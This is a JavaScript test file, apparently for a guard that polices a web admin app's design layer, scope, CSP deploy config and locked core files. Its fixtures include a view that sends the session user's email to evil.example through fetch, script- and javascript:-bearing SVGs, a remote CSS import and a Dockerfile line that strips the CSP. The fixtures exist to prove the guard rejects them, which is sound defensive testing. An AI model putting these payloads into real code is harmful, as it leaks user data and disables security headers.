#!/usr/bin/env node
// Unit-style tests for the design-layer guard (no dependencies). Run: node scripts/test-guard.mjs
// Proves: each rule fails on a violating fixture, a valid design passes, a diff touching lib/ fails the scope
// check, the schema validators fall back per entry, and the CLI exit codes (0 ok / 1 violations / 2 usage).
import { readFileSync, writeFileSync, mkdirSync, mkdtempSync, cpSync, rmSync, existsSync } from "node:fs";
import { spawnSync, execFileSync } from "node:child_process";
import { tmpdir } from "node:os";
import { fileURLToPath } from "node:url";
import path from "node:path";
import { scanCode, scanDataJs, scanCss, scanAsset, scopeViolations } from "./lib/design-scan.mjs";
import { validateCopy, validateRoutes, defaultsProblems, WARNED_CONFIRM_IDS, LIMITS } from "../lib/design-schema.js";
import { fixedWarning } from "../core/warnings.js";
import { CORE_CONFIRM_IDS, CORE_TEXT } from "../lib/fixed-text.js";
import { deployChecks } from "./check-design.mjs";
import { CASES } from "./__fixtures__/cases.mjs";

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const api = Object.fromEntries(Object.entries(JSON.parse(readFileSync(path.join(ROOT, "lib/public-api.json"), "utf8"))).filter(([k]) => k !== "_comment"));
let pass = 0, fail = 0;
const ok = (name, cond, extra = "") => { if (cond) { pass++; } else { fail++; console.error(`  FAIL ${name} ${extra}`); } };

// ── 1. rule fixtures ──
for (const c of CASES) {
  let found;
  if (c.kind === "code") found = scanCode(c.src, "design/views/fixture.js", { api, designRelPath: "design/views/fixture.js" });
  else if (c.kind === "data") found = scanDataJs(c.src, "design/copy.js");
  else found = scanCss(c.src, "design/theme.css", "design/theme.css");
  const rules = found.map((x) => x.rule);
  if (c.expect === null) ok(`valid: ${c.name}`, found.length === 0, JSON.stringify(found));
  else ok(`violation: ${c.name} -> ${c.expect}`, rules.includes(c.expect), `got ${JSON.stringify(rules)}`);
}

// ── 2. assets ──
const png = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(32)]);
ok("valid png asset", scanAsset(png, "design/assets/logo.png").length === 0);
ok("valid passive svg", scanAsset(Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 8 8"><path d="M0 0h8v8z"/></svg>'), "design/assets/mark.svg").length === 0);
ok("violation: .exe asset", scanAsset(Buffer.from("MZ"), "design/assets/x.exe").some((x) => x.rule === "asset/type"));
ok("violation: .html asset", scanAsset(Buffer.from("<html>"), "design/assets/x.html").some((x) => x.rule === "asset/type"));
ok("violation: .js asset", scanAsset(Buffer.from("alert(1)"), "design/assets/x.js").some((x) => x.rule === "asset/type"));
ok("violation: oversize png", scanAsset(Buffer.concat([png, Buffer.alloc(LIMITS.assetMaxBytes)]), "design/assets/big.png").some((x) => x.rule === "asset/size"));
ok("violation: png with the wrong magic bytes", scanAsset(Buffer.from("this is not a png at all, just text"), "design/assets/fake.png").some((x) => x.rule === "asset/magic"));
for (const [name, svg] of [
  ["script", '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'],
  ["onload", '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>'],
  ["foreignObject", '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><iframe/></foreignObject></svg>'],
  ["external href", '<svg xmlns="http://www.w3.org/2000/svg"><image href="https://evil.example/p.png"/></svg>'],
  ["javascript:", '<svg xmlns="http://www.w3.org/2000/svg"><a href="javascript:alert(1)"><text>x</text></a></svg>'],
  ["entity", '<!DOCTYPE svg [<!ENTITY x "y">]><svg xmlns="http://www.w3.org/2000/svg"/>'],
  ["css url()", '<svg xmlns="http://www.w3.org/2000/svg"><rect style="fill:url(https://evil.example/x)"/></svg>'],
]) ok(`violation: active svg (${name})`, scanAsset(Buffer.from(svg), "design/assets/bad.svg").some((x) => x.rule === "asset/svg-active"));

// ── 3. scope check ──
ok("scope: design files pass", scopeViolations(["design/copy.js", "design/views/home.js", "design/assets/logo.png", "design/theme.css"]).length === 0);
ok("scope: lib/ change fails", scopeViolations(["design/theme.css", "lib/api.js"]).some((x) => x.rule === "scope/outside-design" && x.file === "lib/api.js"));
for (const p of ["app.js", "index.html", "ui/kit.js", "core/actions.js", "design-defaults/copy.js", "scripts/check-design.mjs", "scripts/core.manifest.json", "e2e/run.mjs", "styles.css", "config.js", "../outside.txt", "design/../lib/api.js", "/etc/passwd", "designs/x.css", "DESIGN/x.css"]) {
  ok(`scope: ${p} fails`, scopeViolations([p]).length === 1);
}
ok("scope: windows separators are normalised", scopeViolations(["design\\views\\home.js"]).length === 0 && scopeViolations(["lib\\api.js"]).length === 1);

// ── 4. schema fallbacks (the loader and the guard share this code) ──
{
  const defaults = { "a.b": "hello {name}", "c.d": "plain" };
  const r = validateCopy({ "a.b": "hi {name}!", "c.d": 5, "x.y": "unknown", "a b": "bad key", "e": "x" }, defaults);
  ok("copy: a valid entry is kept", r.copy["a.b"] === "hi {name}!");
  ok("copy: wrong type, unknown and malformed keys are dropped with warnings", !("c.d" in r.copy) && !("x.y" in r.copy) && r.warnings.length === 4, JSON.stringify(r.warnings));
  ok("copy: a string over the cap is dropped", !("a.b" in validateCopy({ "a.b": "x".repeat(LIMITS.copyValueMax + 1) }, defaults).copy));
  ok("copy: an invented placeholder is dropped", !("a.b" in validateCopy({ "a.b": "hi {secret}" }, defaults).copy));
  ok("copy: not an object falls back entirely", Object.keys(validateCopy("nope", defaults).copy).length === 0);
  // fixed confirmation warnings are core-owned: copy can never define, replace or remove them
  const real = (await import("../design-defaults/copy.js")).default;
  const fw = validateCopy({ "confirm.cancelOrder.warning": "放心，可以復原", "confirm.deleteProduct.warn": "x", "confirm.newThing.warning": "y", "confirm.cancelOrder.message": "確定？無法復原不會顯示", "confirm.cancelOrder.text": "你確定嗎？" }, real);
  ok("copy: a confirm .warning / .warn key is rejected (even for an unknown confirm id)", !Object.keys(fw.copy).some((k) => /warn/.test(k)) && fw.warnings.filter((w) => /cannot be defined/.test(w)).length === 3, JSON.stringify(fw.warnings));
  ok("copy: the retired .message key of an irreversible confirm is ignored with a rename note (not a violation)", !("confirm.cancelOrder.message" in fw.copy) && !fw.warnings.some((w) => /\.message/.test(w)) && fw.retired.some((w) => /confirm\.cancelOrder\.message.*confirm\.cancelOrder\.text/.test(w)), JSON.stringify(fw));
  ok("copy: the editable .text lead-in of an irreversible confirm is accepted", fw.copy["confirm.cancelOrder.text"] === "你確定嗎？");
  ok("defaults: no warning key and no retired .message key for irreversible confirms", defaultsProblems(real).length === 0, JSON.stringify(defaultsProblems(real)));
  ok("defaults: a defaults file that defines a warning is reported", defaultsProblems({ "confirm.cancelOrder.warning": "x" }).length === 1);
  ok("core: every irreversible confirm has a fixed warning and a non-empty text", WARNED_CONFIRM_IDS.every((id) => fixedWarning(id, { id: 1, email: "a@b.c" }).length > 5 && (CORE_CONFIRM_IDS.includes(id) ? (`cf.${id}.title` in CORE_TEXT && `cf.${id}.yes` in CORE_TEXT && !Object.keys(real).some((k) => k.startsWith(`confirm.${id}.`))) : (`confirm.${id}.title` in real && (`confirm.${id}.text` in real) && `confirm.${id}.yes` in real))));
  const rr = validateRoutes({ home: "views/home.js", nope: "views/x.js", orders: "../lib/api.js", team: "views/../x.js", shipping: 5, reports: "https://x/y.js" });
  ok("routes: only a known id with a views/ path is kept", Object.keys(rr.routes).join() === "home" && rr.warnings.length === 5, JSON.stringify(rr));
}

// ── 5. the CLI on temporary checkouts ──
const CLI = (root, ...args) => spawnSync(process.execPath, [path.join(root, "scripts/check-design.mjs"), "--root", root, ...args], { encoding: "utf8" });
function checkout() {
  const dir = mkdtempSync(path.join(tmpdir(), "admin-guard-"));
  cpSync(ROOT, dir, { recursive: true, filter: (src) => !/[\\/](\.git|e2e|node_modules)([\\/]|$)/.test(src) && !/config\.local\.js$/.test(src) });
  return dir;
}
const write = (root, rel, text) => { mkdirSync(path.dirname(path.join(root, rel)), { recursive: true }); writeFileSync(path.join(root, rel), text); };
const git = (root, ...a) => execFileSync("git", ["-c", "user.email=t@t", "-c", "user.name=t", ...a], { cwd: root, stdio: "pipe", encoding: "utf8" });

{
  const real = spawnSync(process.execPath, [path.join(ROOT, "scripts/check-design.mjs")], { encoding: "utf8" });
  ok("the shipped repo passes the guard (exit 0)", real.status === 0, real.stdout + real.stderr);
}
{
  const dir = checkout();
  try {
    let r = CLI(dir);
    ok("fresh checkout: exit 0", r.status === 0, r.stderr);

    r = CLI(dir, "--files", "design/theme.css", "lib/api.js");
    ok("--files with a lib/ path: exit 1 + scope rule", r.status === 1 && /scope\/outside-design/.test(r.stderr), r.stderr);
    r = CLI(dir, "--files", "design/theme.css", "design/views/home.js");
    ok("--files design-only: exit 0", r.status === 0, r.stderr);

    // hostile view registered in routes.js
    write(dir, "design/views/evil.js", `export default function view(root, ctx) { fetch("https://evil.example/?d=" + ctx.session.userEmail); }`);
    write(dir, "design/routes.js", readFileSync(path.join(dir, "design/routes.js"), "utf8").replace('home: "views/home.js"', 'home: "views/evil.js"'));
    r = CLI(dir);
    ok("a view that calls fetch: exit 1 + forbidden-identifier", r.status === 1 && /js\/forbidden-identifier/.test(r.stderr), r.stderr);
    rmSync(path.join(dir, "design/views/evil.js"));
    r = CLI(dir);
    ok("routes.js pointing at a missing file: exit 1", r.status === 1 && /does not exist/.test(r.stderr), r.stderr);
    write(dir, "design/routes.js", readFileSync(path.join(ROOT, "design/routes.js"), "utf8"));
    ok("restored: exit 0", CLI(dir).status === 0);

    // copy.js problems
    const copy = readFileSync(path.join(ROOT, "design/copy.js"), "utf8");
    write(dir, "design/copy.js", copy.replace('"nav.orders": "訂單"', '"nav.orders": "訂單", "nav.invented": "x"'));
    r = CLI(dir);
    ok("copy.js with an unknown key: exit 1", r.status === 1 && /schema\/copy/.test(r.stderr) && /nav\.invented/.test(r.stderr), r.stderr);
    write(dir, "design/copy.js", copy.replace('"nav.orders": "訂單"', `"nav.orders": "${"長".repeat(700)}"`));
    r = CLI(dir);
    ok("copy.js with an over-long string: exit 1", r.status === 1 && /longer than/.test(r.stderr), r.stderr);
    write(dir, "design/copy.js", copy.replace('"home.greeting": "你好，{shop}"', '"home.greeting": "你好，{shop} {token}"'));
    r = CLI(dir);
    ok("copy.js inventing a placeholder: exit 1", r.status === 1 && /placeholder/.test(r.stderr), r.stderr);
    write(dir, "design/copy.js", copy.replace('"nav.orders": "訂單"', '"nav.orders": String(1)'));
    r = CLI(dir);
    ok("copy.js with a call: exit 1 (data file must be pure)", r.status === 1 && /js\/data-not-pure/.test(r.stderr), r.stderr);
    write(dir, "design/copy.js", copy);

    write(dir, "design/copy.js", copy.replace('"confirm.cancelOrder.yes"', '"confirm.cancelOrder.warning": "可以復原", "confirm.cancelOrder.yes"'));
    r = CLI(dir);
    ok("copy.js defining a confirmation warning: exit 1 (the warning is fixed by the core)", r.status === 1 && /schema\/copy/.test(r.stderr) && /FIXED/.test(r.stderr), r.stderr);
    write(dir, "design/copy.js", copy.replace('"confirm.cancelOrder.text"', '"confirm.cancelOrder.message"'));
    r = CLI(dir);
    ok("copy.js still using the retired .message key (a v0.1.0 merchant): exit 0, a note says to rename it, the key is ignored", r.status === 0 && /note \(not a failure\).*confirm\.cancelOrder\.message/.test(r.stdout), r.stdout + r.stderr);
    write(dir, "design/copy.js", copy);

    // deploy config: a strict CSP is a deployment requirement, so the hosting files must carry it
    ok("deploy: the shipped nginx template and Dockerfile pass", deployChecks(dir).length === 0, JSON.stringify(deployChecks(dir)));
    const ng = readFileSync(path.join(dir, "deploy/nginx.conf.template"), "utf8");
    const dk = readFileSync(path.join(dir, "deploy/Dockerfile"), "utf8");
    const dep = (nginx, docker = dk) => { write(dir, "deploy/nginx.conf.template", nginx); write(dir, "deploy/Dockerfile", docker); return deployChecks(dir).map((x) => x.rule).join(); };
    ok("deploy: no CSP header at all -> csp-missing", /deploy\/csp-missing/.test(dep(ng.replace(/^\s*add_header Content-Security-Policy.*$/gm, ""))));
    ok("deploy: a commented-out CSP does not count", /deploy\/csp-missing/.test(dep(ng.replace(/^(\s*)add_header Content-Security-Policy(.*)$/gm, "$1# add_header Content-Security-Policy$2"))));
    ok("deploy: script-src with 'unsafe-inline' -> csp-weak", /deploy\/csp-weak/.test(dep(ng.replace("script-src 'self'", "script-src 'self' 'unsafe-inline'"))));
    ok("deploy: a wildcard source -> csp-weak", /deploy\/csp-weak/.test(dep(ng.replace("default-src 'self'", "default-src *"))));
    ok("deploy: object-src not 'none' -> csp-weak", /deploy\/csp-weak/.test(dep(ng.replace("object-src 'none'", "object-src 'self'"))));
    ok("deploy: CSP without `always` -> csp-always", /deploy\/csp-always/.test(dep(ng.replace("object-src 'none'\" always;", "object-src 'none'\";"))));
    ok("deploy: a Dockerfile that does not install the template -> csp-dockerfile", /deploy\/csp-dockerfile/.test(dep(ng, dk.replace(/^COPY deploy\/nginx\.conf\.template.*$/m, ""))));
    ok("deploy: a Dockerfile that strips the CSP -> csp-dockerfile", /deploy\/csp-dockerfile/.test(dep(ng, dk + "RUN sed -i '/Content-Security-Policy/d' /etc/nginx/templates/default.conf.template\n")));
    // per-location rules: nginx does not inherit add_header into a location that sets its own
    const locMsgs = (nginx) => { dep(nginx); return deployChecks(dir).map((x) => `${x.rule} ${x.msg}`).join("\n"); };
    const inLoc = (head, fn) => { const i = ng.indexOf(`location ${head} {`); const j = ng.indexOf("\n    }", i); return ng.slice(0, i) + fn(ng.slice(i, j)) + ng.slice(j); };
    ok("deploy: no server-level CSP (locations keep theirs) -> csp-missing", /deploy\/csp-missing/.test(dep(ng.replace(/^ {4}add_header Content-Security-Policy .*$/m, ""))));
    ok("deploy: /site-config.js CSP weakened (unsafe-inline) -> csp-weak naming the location", /csp-weak location = \/site-config\.js/.test(locMsgs(inLoc("= /site-config.js", (b) => b.replace("script-src 'self'", "script-src 'self' 'unsafe-inline'")))));
    ok("deploy: /site-config.js CSP weakened (default-src *) -> csp-weak", /csp-weak location = \/site-config\.js/.test(locMsgs(inLoc("= /site-config.js", (b) => b.replace("default-src 'self'", "default-src *")))));
    ok("deploy: /site-config.js CSP without frame-ancestors -> csp-weak", /csp-weak location = \/site-config\.js/.test(locMsgs(inLoc("= /site-config.js", (b) => b.replace(" frame-ancestors 'none';", "")))));
    ok("deploy: /content.schema.json CSP weakened (default-src *) -> csp-weak naming the location", /csp-weak location = \/content\.schema\.json/.test(locMsgs(inLoc("= /content.schema.json", (b) => b.replace("default-src 'none'", "default-src *")))));
    ok("deploy: /content.schema.json CSP with script-src 'unsafe-inline' -> csp-weak", /csp-weak location = \/content\.schema\.json/.test(locMsgs(inLoc("= /content.schema.json", (b) => b.replace("default-src 'none';", "default-src 'none'; script-src 'unsafe-inline';")))));
    ok("deploy: /content.schema.json without its CSP -> loc-headers naming the location", /loc-headers location = \/content\.schema\.json.*Content-Security-Policy/.test(locMsgs(inLoc("= /content.schema.json", (b) => b.replace(/^\s*add_header Content-Security-Policy .*$/m, "")))));
    ok("deploy: a location without the full header set -> loc-headers naming the location", /loc-headers location = \/site-config\.js.*X-Frame-Options/.test(locMsgs(inLoc("= /site-config.js", (b) => b.replace(/^\s*add_header X-Frame-Options .*$/m, "")))));
    ok("deploy: a location CSP without `always` -> csp-always", /csp-always location = \/site-config\.js/.test(locMsgs(inLoc("= /site-config.js", (b) => b.replace("object-src 'none'\" always;", "object-src 'none'\";")))));
    ok("deploy: the current template still passes (strict /content.schema.json CSP is accepted)", (dep(ng), deployChecks(dir).length === 0), JSON.stringify(deployChecks(dir)));
    // hardening: server-level CSP strength, quote-aware comment stripping, scheme sources
    const srvRe = /^ {4}add_header Content-Security-Policy .*$/m;
    const srvLine = ng.match(srvRe)[0];
    ok("deploy: weak server CSP placed after strong location CSPs -> csp-weak 'server level'", /csp-weak server level/.test(locMsgs(ng.replace(srvRe, "").replace(/\n(\s*)\}\s*$/, (m0) => m0) + "\n" + srvLine.replace("script-src 'self'", "script-src 'self' 'unsafe-inline'"))));
    ok("deploy: server CSP with default-src * -> csp-weak 'server level'", /csp-weak server level/.test(locMsgs(ng.replace(srvRe, srvLine.replace("default-src 'self'", "default-src *")))));
    ok("deploy: server CSP with scheme source in script-src -> csp-weak", /csp-weak server level.*scheme source/.test(locMsgs(ng.replace(srvRe, srvLine.replace("script-src 'self'", "script-src 'self' https:")))));
    ok("deploy: a commented-out add_header (trailing # comment) is never counted", /loc-headers location = \/site-config\.js.*X-Frame-Options/.test(locMsgs(inLoc("= /site-config.js", (b) => b.replace(/^(\s*)add_header X-Frame-Options (.*)$/m, "$1# add_header X-Frame-Options $2")))) && /loc-headers location = \/site-config\.js.*X-Frame-Options/.test(locMsgs(inLoc("= /site-config.js", (b) => b.replace(/^(\s*)(add_header X-Frame-Options .*)$/m, "$1proxy_pass_request_body on; # $2")))));
    ok("deploy: a trailing comment after a live add_header does not hide it, and # inside a quoted value is kept", (dep(ng.replace(srvLine, srvLine.replace(/;$/, "; # note")).replace("object-src 'none'\" always;", "object-src 'none'; report-uri /r#frag\" always;")), deployChecks(dir).length === 0), JSON.stringify(deployChecks(dir)));
    ok("deploy: scheme source https: in /content.schema.json default-src -> csp-weak", /csp-weak location = \/content\.schema\.json.*scheme source https:/.test(locMsgs(inLoc("= /content.schema.json", (b) => b.replace("default-src 'none'", "default-src https:")))));
    ok("deploy: scheme source data: in /site-config.js connect-src -> csp-weak", /csp-weak location = \/site-config\.js.*scheme source data:/.test(locMsgs(inLoc("= /site-config.js", (b) => b.replace("connect-src", "connect-src data:")))));
    ok("deploy: a missing deploy/ directory -> csp-missing", (rmSync(path.join(dir, "deploy"), { recursive: true }), /deploy\/csp-missing/.test(deployChecks(dir).map((x) => x.rule).join())));
    cpSync(path.join(ROOT, "deploy"), path.join(dir, "deploy"), { recursive: true });
    ok("deploy: restored -> passes", deployChecks(dir).length === 0);
    // D19 (owner-approved rule change 2026-11-28): script-src is exactly 'self' + the sha256 of the import map text in index.html, nothing else; one inline import map, no other inline script
    {
      const idx = readFileSync(path.join(dir, "index.html"), "utf8");
      const ngHash = ng.match(/script-src 'self' ('sha256-[A-Za-z0-9+/=]+')/)[1];
      const setIdx = (html) => write(dir, "index.html", html);
      const rules = () => deployChecks(dir).map((x) => `${x.rule} ${x.msg}`).join("\n");
      write(dir, "deploy/nginx.conf.template", ng); setIdx(idx);
      ok("D19: the shipped index.html + nginx template agree (hash of the import map text)", deployChecks(dir).length === 0, rules());
      const withNg = (n) => { write(dir, "deploy/nginx.conf.template", n); return rules(); };
      ok("D19: script-src 'self' without the hash -> csp-weak", /csp-weak.*must be exactly 'self' 'sha256-/.test(withNg(ng.replaceAll(` ${ngHash}`, ""))));
      ok("D19: order tolerant ('sha256-..' 'self') passes", withNg(ng.replaceAll(`'self' ${ngHash};`, `${ngHash} 'self';`)) === "");
      ok("D19: another hash -> csp-weak", /csp-weak/.test(withNg(ng.replaceAll(ngHash, "'sha256-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA='"))));
      ok("D19: the right hash AND another hash -> csp-weak", /csp-weak/.test(withNg(ng.replaceAll(ngHash, `${ngHash} 'sha256-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA='`))));
      ok("D19: the hash twice -> csp-weak", /csp-weak/.test(withNg(ng.replaceAll(ngHash, `${ngHash} ${ngHash}`))));
      ok("D19: hash + 'unsafe-inline' -> csp-weak", /csp-weak/.test(withNg(ng.replaceAll(ngHash, `${ngHash} 'unsafe-inline'`))));
      ok("D19: hash + 'unsafe-eval' -> csp-weak", /csp-weak/.test(withNg(ng.replaceAll(ngHash, `${ngHash} 'unsafe-eval'`))));
      ok("D19: hash + a nonce -> csp-weak", /csp-weak/.test(withNg(ng.replaceAll(ngHash, `${ngHash} 'nonce-abc123'`))));
      ok("D19: hash + 'strict-dynamic' -> csp-weak", /csp-weak/.test(withNg(ng.replaceAll(ngHash, `${ngHash} 'strict-dynamic'`))));
      ok("D19: hash + a host -> csp-weak", /csp-weak/.test(withNg(ng.replaceAll(ngHash, `${ngHash} https://cdn.example`))));
      ok("D19: hash + a scheme source -> csp-weak", /csp-weak/.test(withNg(ng.replaceAll(ngHash, `${ngHash} https:`))));
      ok("D19: a sha384 / sha512 token instead -> csp-weak", /csp-weak/.test(withNg(ng.replaceAll(ngHash, "'sha384-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'"))));
      ok("D19: a hash smuggled into another directive (default-src) -> csp-weak", /csp-weak.*default-src/.test(withNg(ng.replaceAll("default-src 'self';", `default-src 'self' ${ngHash};`))));
      ok("D19: a hash in script-src-elem -> csp-weak", /csp-weak/.test(withNg(ng.replaceAll("worker-src", `script-src-elem 'self' ${ngHash}; worker-src`))));
      ok("D19: /site-config.js CSP without the hash -> csp-weak naming the location", /csp-weak location = \/site-config\.js/.test(locMsgs(inLoc("= /site-config.js", (b) => b.replace(` ${ngHash}`, "")))));
      ok("D19: /site-config.js CSP with a nonce -> csp-weak naming the location", /csp-weak location = \/site-config\.js/.test(locMsgs(inLoc("= /site-config.js", (b) => b.replace(ngHash, `${ngHash} 'nonce-x'`)))));
      ok("D19: /site-config.js CSP with another hash -> csp-weak naming the location", /csp-weak location = \/site-config\.js/.test(locMsgs(inLoc("= /site-config.js", (b) => b.replace(ngHash, "'sha256-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA='")))));
      write(dir, "deploy/nginx.conf.template", ng);
      // the import map text changes -> the hash in nginx no longer matches (a tampered or edited map)
      setIdx(idx.replace('"/lib/canary/allowed/":"/lib/canary/allowed/"', '"/lib/canary/allowed/":"/lib/canary/allowed/","/lib/":"/lib/"'));
      ok("D19: a changed import map text (hash mismatch) -> csp-weak", /csp-weak.*must be exactly 'self' 'sha256-/.test(rules()));
      // --update recomputes the hash and rewrites the nginx template (the documented human flow)
      const manifest0 = readFileSync(path.join(dir, "scripts/core.manifest.json"), "utf8");
      const up = CLI(dir, "--update");
      ok("D19: --update rewrites the hash in the nginx template", up.status === 0 && /written to deploy\/nginx\.conf\.template/.test(up.stdout), up.stdout + up.stderr);
      ok("D19: ... and then deploy passes again", deployChecks(dir).length === 0, rules());
      write(dir, "deploy/nginx.conf.template", ng); setIdx(idx); write(dir, "scripts/core.manifest.json", manifest0); // --update also re-locked the manifest of the temp copy
      // index.html rules
      const inl = (s) => `<script>${s}</script>`;
      setIdx(idx.replace("</head>", `${inl("1+1")}</head>`));
      ok("D19: a second INLINE script -> deploy/importmap", /deploy\/importmap.*no inline script other than the import map/.test(rules()));
      setIdx(idx.replace("</head>", `<script type="module">import("/x.js")</script></head>`));
      ok("D19: an inline module script -> deploy/importmap", /deploy\/importmap.*other than the import map/.test(rules()));
      setIdx(idx.replace("</head>", `${inl("1")}</head>`).replace("<script>1</script>", "<SCRIPT >1</SCRIPT >"));
      ok("D19: <SCRIPT > spelling variants are still inline scripts", /deploy\/importmap/.test(rules()));
      setIdx(idx.replace(/<script type="importmap">[^<]*<\/script>/, ""));
      setIdx(idx.replace("</head>", '<script data-src=1>1</script></head>'));
      ok("D19: <script data-src=1> is an INLINE script (data-src is not src) -> deploy/importmap", /deploy\/importmap.*other than the import map/.test(rules()));
      setIdx(idx.replace("</head>", '<!--><script>1</script></head>'));
      ok("D19: <!--> is an empty comment, the script after it is inline -> deploy/importmap", /deploy\/importmap.*other than the import map/.test(rules()));
      setIdx(idx.replace("</head>", "<script type='module' >1</script></head>"));
      ok("D19: single-quoted attributes are read -> deploy/importmap", /deploy\/importmap.*other than the import map/.test(rules()));
      setIdx(idx.replace("</head>", '<script title="a > b">1</script></head>'));
      ok("D19: a > inside a quoted attribute does not end the tag -> deploy/importmap", /deploy\/importmap.*other than the import map/.test(rules()));
      setIdx(idx.replace("</head>", '<script src="x.js" data-x=1></script></head>'));
      ok("D19: a real src attribute is still an external script (no false positive)", !/deploy\/importmap/.test(rules()));
      setIdx(idx.replace('type="importmap"', "type=IMPORTMAP"));
      ok("D19: the map with an unquoted upper-case type is still the one import map", !/deploy\/importmap/.test(rules()), rules());
      setIdx(idx.replace(/<script type="importmap">[^<]*<\/script>/, ""));
      ok("D19: no import map at all -> deploy/importmap (exactly ONE required)", /deploy\/importmap.*exactly ONE.*found 0/.test(rules()));
      const mapTag = idx.match(/<script type="importmap">[^<]*<\/script>/)[0];
      setIdx(idx.replace(mapTag, mapTag + mapTag));
      ok("D19: two import maps -> deploy/importmap", /deploy\/importmap.*exactly ONE.*found 2/.test(rules()));
      setIdx(idx.replace(mapTag, mapTag + `<script type="importmap">{}</script>`));
      ok("D19: a second import map with other text -> deploy/importmap", /deploy\/importmap.*exactly ONE/.test(rules()));
      setIdx(idx.replace("</head>", `<!-- ${inl("2+2")} --></head>`));
      ok("D19: an inline script inside an HTML comment is not a script (passes)", deployChecks(dir).length === 0, rules());
      // D23: tokenizer gaps. A comment ends at --!> too (the old regex waited for --> and hid the script in between), and an unterminated <script> fails closed.
      setIdx(idx.replace("</head>", '<!-- x --!><script>1</script><!-- y --></head>'));
      ok("D23: a comment ended by --!> does not hide the inline script after it -> deploy/importmap", /deploy\/importmap.*other than the import map/.test(rules()), rules());
      setIdx(idx.replace("</head>", '<!--- a --!><script>1</script></head>'));
      ok("D23: --!> ends a comment even without a later --> -> deploy/importmap", /deploy\/importmap.*other than the import map/.test(rules()), rules());
      setIdx(idx.replace("</head>", '<!---><script>1</script><!-- z --></head>'));
      ok("D23: <!---> is an empty comment, the script after it is inline -> deploy/importmap", /deploy\/importmap.*other than the import map/.test(rules()), rules());
      setIdx(idx.replace("</head>", '<!-- <script>1</script> --!></head>'));
      ok("D23: a script inside a comment that ends with --!> is still hidden (no false positive)", deployChecks(dir).length === 0, rules());
      const cut = idx.slice(0, idx.indexOf("</head>")); // nothing after the new element: no later </script> or > can close it
      setIdx(cut + "<script>1+1");
      ok("D23: an unterminated <script> (no </script> anywhere after it) -> deploy/importmap, fail closed", /deploy\/importmap.*never closed/.test(rules()), rules());
      setIdx(cut + '<script type="importmap">{}');
      ok("D23: an unterminated import map is refused and not counted as a second map", /deploy\/importmap.*never closed/.test(rules()) && !/exactly ONE.*found 2/.test(rules()), rules());
      setIdx(cut + "<script defer");
      ok("D23: a <script start tag that never reaches its > -> deploy/importmap, fail closed", /deploy\/importmap.*never closed/.test(rules()), rules());
      setIdx(idx.replace("</head>", '<script>1+1</head>'));
      ok("D23: a script closed only by a LATER </script> is what the browser runs too: refused as an ordinary inline script", /deploy\/importmap.*other than the import map/.test(rules()), rules());
      setIdx(idx.replace("</head>", '<script>1</script x>'));
      ok("D23: </script x> (an end tag with attributes) still ends the script: seen as an ordinary inline script", /deploy\/importmap.*other than the import map/.test(rules()) && !/never closed/.test(rules()), rules());
      setIdx(idx.replace("</head>", `<script src="extra.js"></script></head>`));
      ok("D19: an external script is not inline (the other guards police it)", !/deploy\/importmap/.test(rules()));
      setIdx(idx);
      ok("D19: restored -> passes", deployChecks(dir).length === 0, rules());
    }

    // theme / assets
    write(dir, "design/theme.css", `@import url(https://evil.example/x.css);`);
    r = CLI(dir);
    ok("theme.css with a remote @import: exit 1", r.status === 1 && /css\/import/.test(r.stderr), r.stderr);
    write(dir, "design/theme.css", "");
    write(dir, "design/assets/payload.html", "<script>alert(1)</script>");
    r = CLI(dir);
    ok("an .html file in assets: exit 1", r.status === 1 && /asset\/type/.test(r.stderr), r.stderr);
    rmSync(path.join(dir, "design/assets/payload.html"));
    write(dir, "design/views/notes.json", "{}");
    r = CLI(dir);
    ok("a stray .json under design/: exit 1", r.status === 1 && /files\/type/.test(r.stderr), r.stderr);
    rmSync(path.join(dir, "design/views/notes.json"));
    write(dir, "design/extra.js", "export default {};");
    r = CLI(dir);
    ok("a stray .js directly in design/: exit 1", r.status === 1 && /files\/location/.test(r.stderr), r.stderr);
    rmSync(path.join(dir, "design/extra.js"));
    ok("clean again: exit 0", CLI(dir).status === 0);

    // locked core
    const api0 = readFileSync(path.join(dir, "lib/api.js"), "utf8");
    write(dir, "lib/api.js", api0 + "\n// tampered\n");
    r = CLI(dir);
    ok("a locked core file changed: exit 1 + manifest rule", r.status === 1 && /manifest\/changed/.test(r.stderr) && /lib\/api\.js/.test(r.stderr), r.stderr);
    write(dir, "lib/api.js", api0.replace(/\r\n/g, "\n").replace(/\n/g, "\r\n"));
    ok("CRLF line endings hash the same as LF", CLI(dir).status === 0);
    write(dir, "lib/api.js", api0 + "\n// intentional\n");
    ok("--update accepts an intentional core change", CLI(dir, "--update").status === 0 && CLI(dir).status === 0);
    write(dir, "design-defaults/views/home.js", readFileSync(path.join(dir, "design-defaults/views/home.js"), "utf8") + "\n// tampered default view\n");
    r = CLI(dir);
    ok("the pristine default views are locked too", r.status === 1 && /design-defaults\/views\/home\.js/.test(r.stderr), r.stderr);

    // public-api manifest
    const pa = JSON.parse(readFileSync(path.join(ROOT, "lib/public-api.json"), "utf8"));
    write(dir, "design-defaults/views/home.js", readFileSync(path.join(ROOT, "design-defaults/views/home.js"), "utf8"));
    pa["ctx.ui"].push("wipeEverything");
    write(dir, "lib/public-api.json", JSON.stringify(pa));
    r = CLI(dir, "--no-layers");
    ok("public-api.json listing a function that does not exist: exit 1", r.status === 1 && /ctx\/manifest/.test(r.stderr) && /wipeEverything/.test(r.stderr), r.stderr);

    r = CLI(dir, "--base", "no-such-ref-xyz");
    ok("unreadable --base: exit 2", r.status === 2, `${r.status} ${r.stderr}`);
    r = spawnSync(process.execPath, [path.join(ROOT, "scripts/check-design.mjs"), "--root", path.join(dir, "nowhere")], { encoding: "utf8" });
    ok("unreadable --root: exit 2", r.status === 2, `${r.status} ${r.stderr}`);
  } finally { rmSync(dir, { recursive: true, force: true }); }
}
{
